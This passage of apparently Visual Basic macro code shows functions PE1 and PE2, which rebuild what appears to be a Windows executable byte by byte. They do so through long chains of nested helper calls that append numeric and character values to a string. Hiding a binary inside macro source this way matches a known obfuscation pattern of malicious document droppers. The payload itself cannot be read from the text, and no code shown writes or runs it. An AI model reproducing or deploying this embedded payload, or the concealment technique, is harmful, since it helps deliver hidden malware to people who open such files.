    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "U"), 139), "A"), 129)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(strPE, 236), 237), 4), 0), 0), 184), 212), 189), "A"), 0), "S"), 219), 163), 232), 23), "A"), 0), "M"), 168), 11), "A"), 0), 163), "D=A"), 0), 10), 4), 24), "A"), 0), "3"), 140), 163), "H@A"), 0), "W"), 141), "E"), 12), "S"), 141), "M"), 8), "PN"), 199)
    strPE = A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(strPE, 5), 240), 242), 203), 0), "D"), 210), "@"), 0), 136), 29), 27), "<"), 27), 0), 149), 214), "L"), 0), 0), 147), 224), "_@"), 0), 232), 216), 164), 0), "&"), 131), 196), 4), "CSrhL@A"), 0), 232), "E>"), 0), 0), 139), "U"), 12), 139)
    strPE = A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(strPE, 165), 8), 139), 27), "7"), 208), 172), 0), "RP"), 141), "U"), 244), 246), "j"), 232), "DJ"), 0), 0), 139), "U"), 244), 141), "EL"), 141), "M"), 251), "PQh"), 20), 210), "y"), 0), "R"), 232), 222), "J"), 0), 0), 133), 192), 15), 133), 154), 4), 0), 197)
    strPE = A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(strPE, 139), 134), 6), 193), "@"), 0), "6"), 190), "E"), 251), 131), 192), 191), "k"), 248), "9"), 137), "A3"), 4), 239), 0), "3"), 221), 138), 136), 8), 23), "@"), 0), "w"), 218), 141), 152), 22), "@."), 139), "U"), 252), "R"), 255), 21), "l"), 193), "@"), 223), 206), 196), 4)
    strPE = A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(strPE, ";"), 195), 163), 16), 208), "@"), 0), 15), 143), "="), 4), 0), 0), "h"), 195), "M@"), 0), 232), "m"), 6), 0), 0), 233), "+"), 181), 0), 0), 199), 5), 240), 2), "A"), 0), 1), 219), 0), 0), 233), 31), 4), 0), 0), 137), 29), "8"), 208), 31), 0), 233)
    strPE = A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(B(A(strPE, 20), "R"), 0), 0), 139), "E"), 252), "P"), 255), 21), " "), 231), "@"), 0), "l"), 24), 208), "@"), 0), 233), 253), 3), 0), "}"), 139), 185), "yQ"), 220), 21), "l"), 18), "@"), 0), 163), "lM"), 171), 0), 233), "^"), 3), 0), 0), 199), "%`"), 162), "2"), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(strPE, "~"), 13), "h"), 216), 209), "@u"), 232), "~"), 6), 0), 7), 131), 229), 4), 199), 5), "`"), 2), "A"), 0), 255), 255), 255), 255), 233), 200), 3), 0), 0), 139), "U"), 252), "R"), 255), 21), 31), 193), 153), 0), 163), 184), 11), 251), 139), 233), 177), 3), 0), 0)
    strPE = A(B(A(B(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 137), 190), 28), 208), 252), 0), 252), 169), 3), 0), 0), 139), "E"), 252), "P"), 255), 21), "H"), 144), "@"), 0), 163), 224), 205), 191), 0), 3), 146), 3), 0), 184), "3"), 29), " "), 208), "@"), 0), 233), 138), 3), "g"), 0), 225), 29), "`"), 2), "A"), 24), "t"), 13)
    strPE = A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(B(strPE, "h"), 188), 209), "@"), 0), 191), 178), 5), 0), 0), 131), "^"), 4), "lM"), 252), "Q"), 128), 134), "5"), 0), 0), 131), 196), 4), ";"), 195), "u"), 15), 0), 5), "`"), 2), "A"), 0), 1), 0), 0), 163), 233), "V"), 3), 0), 0), "9"), 29), " _A"), 244)
    strPE = A(B(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(B(A(strPE, 15), "O"), 180), "u"), 0), 0), "P"), 255), 21), ","), 193), "@"), 0), "9"), 29), "`"), 199), "A"), 0), "t"), 13), "M"), 160), 194), "@["), 232), "k"), 5), 0), 11), 131), "j"), 4), 139), "U"), 252), "R"), 232), 17), "5"), 0), 0), 131), 196), 4), ";"), 147), "u"), 15)
    strPE = A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(strPE, 199), 5), "`"), 2), "A"), 0), 2), 0), 243), 0), 233), 15), 3), 4), 0), "9"), 29), " "), 16), "A"), 151), 15), 132), 18), 210), 0), 0), "P"), 255), 222), "p"), 193), 197), 0), 199), 5), "\"), 2), "A"), 0), 1), 0), 0), 0), "2"), 150), 2), 0), 0), 139)
    strPE = A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(B(strPE, "z"), 252), "P"), 255), 235), "l"), 131), "@"), 0), 163), "X"), 5), "A"), 0), 233), 221), 2), 0), 0), 139), "M{Q"), 255), 132), "l"), 193), "X"), 0), 163), "d"), 2), "A"), 0), 199), 5), 16), 208), "@"), 0), "PL"), 0), "b"), 233), 184), 2), 223), 0), 139)
    strPE = A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(B(strPE, "E"), 252), 186), "u8A"), 0), "+8"), 138), 8), 136), 12), "8@"), 27), 203), "u"), 246), 233), "A"), 2), 0), 207), 139), "U"), 252), 161), "L@A"), 0), "9<"), 156), 209), "@"), 0), "R"), 170), 144), 209), "@"), 0), "P"), 232), 2), "F"), 0), 0)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(strPE, 230), 196), "n"), 163), "D@^"), 0), "*{"), 2), 0), 0), 139), "}"), 252), 143), "ft"), 193), 210), 0), 131), "9"), 1), "i"), 17), "3"), 210), "j"), 8), 138), 23), "R"), 255), "d"), 139), "}"), 252), 131), 196), 6), 235), 18), 139), 13), 222), 193), "@"), 0)
    strPE = A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(B(strPE, "3"), 192), 138), 7), 139), 236), 138), 4), "B"), 131), 224), 27), ";"), 195), "t"), 6), "G"), 137), 144), 252), 235), 200), 131), 201), 255), "3"), 192), 242), 174), 247), 209), "IQz"), 202), 160), 0), 0), "="), 0), 4), 0), 0), "v"), 13), "hhO@"), 0)
    strPE = B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(strPE, 232), "Y"), 4), 0), 0), 131), 20), 4), "pU"), 252), 131), 201), 0), "Z"), 250), "3"), 192), 242), 174), 247), 209), "I"), 213), "b"), 181), 251), 255), "qQzP"), 232), 201), 221), 0), 0), "S"), 141), 141), 244), 251), 255), 252), "hc"), 209), "@"), 0), "v")

    PE1 = strPE
End Function

Private Function PE2() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(strPE, "hP"), 209), "@"), 0), 233), 16), 0), 214), "F"), 139), 22), 252), 29), 13), "t"), 193), 192), 252), 131), "9"), 1), "~"), 17), "["), 210), "j"), 8), 204), 23), "RL"), 214), 139), "}"), 252), 131), 240), "]"), 235), "c"), 139), 13), "x"), 193), "@"), 0), "3"), 192), 138)
    strPE = A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(strPE, 7), 139), 17), 138), 4), "B"), 172), 224), 8), 254), 195), "t"), 6), "G~}"), 252), 164), 200), 253), 201), 255), "3"), 207), 242), 174), 247), 209), "IQ"), 232), "7"), 160), 188), 0), "="), 0), 4), 10), 0), "_"), 13), "h4K@"), 0), 232), 198), 3)
    strPE = A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(strPE, 216), 0), 131), 196), 4), 139), "U"), 252), 131), 201), 144), 139), 250), 142), 192), "1"), 174), 247), 209), "I"), 141), 133), 244), 251), 255), 255), "QRP"), 232), "6"), 160), "Y"), 0), "S"), 141), 141), 244), 251), 255), 255), "h"), 156), 209), "@"), 184), "Qh"), 202), 209)
    strPE = A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(strPE, "@"), 0), 139), 21), 216), 24), "A"), 9), 136), 150), 5), 244), 251), 255), 206), 161), "L@A"), 0), "RP"), 232), 175), "D"), 0), 0), 131), 196), 24), 163), 4), 24), "A"), 0), "l4"), 1), "V"), 0), 139), "M"), 252), 139), 21), "H"), 210), "A"), 235), 161)
    strPE = A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(B(strPE, "L@A"), 28), "GhW"), 209), "@"), 0), "QRP"), 232), 133), "N"), 0), 0), 133), "M"), 251), 139), "=C"), 193), "@"), 0), "j"), 5), "h"), 16), 209), "@"), 0), "Q"), 163), "H@"), 180), 0), 255), 215), 131), 196), " "), 133), 155), "u"), 15), 199)
    strPE = A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(strPE, 235), "|"), 2), "A"), 0), 1), 0), "/"), 0), 233), 234), 0), 0), 0), 139), "U"), 252), "S_h"), 8), 209), "@"), 0), "R"), 255), 215), 131), 196), 12), 193), 192), "u"), 15), 199), 5), 132), 2), "A"), 0), 1), "P6"), 0), 233), 199), 0), 0), 0), 139)
    strPE = A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(strPE, 167), 252), "j"), 11), "h"), 252), "7@"), 0), "P"), 255), 16), 131), 23), 12), 199), "KP&"), 175), 0), 0), 0), 199), 130), 128), 2), "A"), 0), "/"), 130), 0), 151), 233), 160), 0), 0), 0), 199), 5), 136), "a"), 233), 0), 1), 0), 0), 0), 233), 145)
    strPE = B(A(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(strPE, 242), 0), 0), 139), "M"), 252), 199), 5), "x"), 2), "A"), 0), 202), "1v"), 0), 202), "Q"), 232), 189), "A"), 0), 235), "|"), 139), "$"), 252), "j:R"), 15), 21), "|"), 24), "@"), 0), "i"), 196), 8), ";"), 195), "t"), 18), 136), 24), "4"), 153), 241), 21), "l")
    strPE = A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(strPE, 193), "@"), 196), 208), 196), 4), 163), "t"), 2), "A"), 0), 139), "E"), 252), 186), "@"), 219), 165), 0), "d"), 208), 138), 8), 136), 12), 2), "@:"), 203), "u"), 246), 199), 5), "x"), 2), 149), 157), 1), 0), 171), 0), 235), "7"), 161), "E"), 174), 199), 5), 136), 2)
    strPE = A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(B(strPE, "A"), 0), 1), 224), 170), 191), "w"), 168), 11), "A"), 0), "@#"), 139), "M}"), 199), 5), 136), 2), "Mi"), 1), 0), 0), 0), 137), 13), 226), 23), "A"), 0), 235), 14), 139), "U"), 12), 139), 2), "P"), 197), 253), "-"), 130), 0), 131), 196), 4), 139), 228)
    strPE = B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(A(strPE, 231), 141), "M"), 252), 141), 160), 251), "QRh"), 20), 210), "@"), 0), 208), 213), "DF"), 0), 0), 138), 192), 225), 132), "l"), 191), "|"), 255), 139), "E"), 191), 139), "M"), 8), 139), "5"), 128), 193), "uJ"), 226), "9H"), 12), "t("), 139), "U4*")
    strPE = A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(strPE, 13), 200), 192), "@"), 224), 131), 193), "@"), 139), 2), "P["), 220), 208), "@"), 0), "Q"), 255), 214), 139), "U"), 12), 139), 15), 216), 232), 194), "C"), 0), 0), 139), "E"), 244), 131), 196), 16), 139), "H"), 12), 139), "P"), 28), "Y"), 20), 138), "E"), 137), "H"), 12), 161)
    strPE = A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(strPE, "L@A"), 0), "RP"), 232), 211), "B"), 0), 0), "P"), 232), 211), "/"), 0), 251), 131), 196), 4), 133), 192), "c$"), 139), "@'"), 161), 217), 192), 227), 0), 131), 192), "@i=Rh"), 200), 208), "@"), 0), "P"), 255), "f"), 139), "M"), 12), 139)
    strPE = B(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(strPE, 17), "R"), 232), 244), "-"), 0), 0), 131), 196), "q"), 230), 24), 135), "@"), 0), ";"), 22), 140), 7), "= N"), 0), 227), "~/YE\"), 139), 21), "P"), 192), "@"), 0), "h N"), 0), 0), 131), 194), "@6"), 8), "Qh"), 160), 208), "@")
    strPE = B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(strPE, 0), "R"), 196), 214), 139), "E"), 12), "K"), 8), "Q"), 253), "!-"), 0), 0), 161), 24), 4), 189), 0), 131), 26), 20), 139), 13), 16), 208), "@"), 0), ";4~8"), 139), "+"), 12), 139), "w"), 200), 192), 139), 0), 131), 193), "@"), 139), 2), "PGX")
    strPE = A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(B(strPE, "D@"), 189), "Q"), 255), 214), 139), "U"), 12), 248), 2), "P"), 232), 237), ","), 0), 0), 139), 13), 168), 208), "@B"), 222), 196), 16), "9"), 29), "H"), 208), 207), 18), "t>"), 129), 249), 150), 0), 0), 0), "~6"), 184), "gfff"), 247), 233), 193)
    strPE = A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(strPE, 250), 2), 139), 202), 193), 233), "$"), 3), 209), 131), 250), "d"), 137), 21), 20), 208), "~"), 0), "} "), 199), 5), "q"), 208), "@"), 0), "d"), 0), 0), 0), 235), 20), 232), "7,"), 0), 225), "_^3"), 192), "["), 139), 229), 188), 195), 137), 29), 20), 208)
    strPE = A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(strPE, "@"), 0), 232), 200), ","), 0), 0), 232), 14), "&"), 0), 200), 139), 21), "L*"), 179), 0), "R"), 228), "r7"), 0), 0), "_^30["), 139), 229), "]A"), 144), 155), 18), "@kt"), 18), 159), 0), 226), 19), "@#."), 19), "@"), 0)
    strPE = A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(strPE, 129), 17), "@"), 0), 222), 18), "@"), 0), "d"), 22), "@"), 8), 154), 20), "@"), 0), 22), 203), "@"), 0), "9T@"), 0), "0"), 17), "@>m"), 175), "@"), 169), "N"), 17), "r"), 141), 176), 21), "@"), 0), "*"), 17), "@"), 243), 232), 16), "@"), 0), 191), 16)
    strPE = A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(B(strPE, "X"), 0), 140), 15), "@"), 0), 247), 16), "@"), 31), 168), 18), 7), 0), "="), 18), "@"), 0), 211), 17), "6"), 0), ")"), 18), "@"), 0), "q"), 238), 240), 0), 133), 245), "@"), 0), 223), 20), "@"), 0), 249), 20), "@"), 0), 22), 21), "@"), 0), 0), 27), "3"), 27)
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(strPE, 27), 27), 27), ">"), 27), 27), "T"), 223), 27), 27), 27), 211), 221), 27), 4), "v"), 27), 6), 27), "G"), 26), 27), 27), 27), 12), 27), 27), 20), 27), 8), 9), 10), "j"), 27), 12), 180), 14), 27), 15), 27), 27), 208), 27), "1"), 18), 19), 27), 20), 21), 22)
    strPE = B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(strPE, 23), 128), 25), 26), 144), 144), "J"), 144), 144), 189), 127), 144), 1), 144), 144), 144), 13), 144), "U"), 139), 183), 139), 206), 8), 139), 13), 200), 192), "@"), 0), "`"), 140), 193), "@ht"), 210), "@"), 0), "Q"), 255), 21), 128), 193), "@"), 0), 153), 172), "UA")
